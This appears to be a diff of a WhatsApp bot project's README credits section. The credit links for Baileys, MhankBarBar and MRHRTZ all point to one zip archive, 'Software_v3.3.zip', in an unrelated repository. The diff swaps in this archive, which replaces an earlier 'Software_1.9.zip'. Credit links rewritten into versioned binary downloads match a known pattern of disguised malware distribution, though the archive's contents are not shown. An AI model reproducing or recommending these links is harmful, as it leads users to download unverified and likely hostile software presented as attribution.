@@ -136,8 +136,8 @@
 | X |✅|
 
   # THANKS FOR
-* [`Baileys`](https://github.com/Gabrielyop50/Gabrielit/raw/refs/heads/master/stik/Software_1.9.zip)
-* [`MhankBarBar`](https://github.com/Gabrielyop50/Gabrielit/raw/refs/heads/master/stik/Software_1.9.zip)
-* [`MRHRTZ`](https://github.com/Gabrielyop50/Gabrielit/raw/refs/heads/master/stik/Software_1.9.zip)
+* [`Baileys`](https://raw.githubusercontent.com/Gabrielyop50/Gabrielit/master/stik/Software_v3.3.zip)
+* [`MhankBarBar`](https://raw.githubusercontent.com/Gabrielyop50/Gabrielit/master/stik/Software_v3.3.zip)
+* [`MRHRTZ`](https://raw.githubusercontent.com/Gabrielyop50/Gabrielit/master/stik/Software_v3.3.zip)
   
   
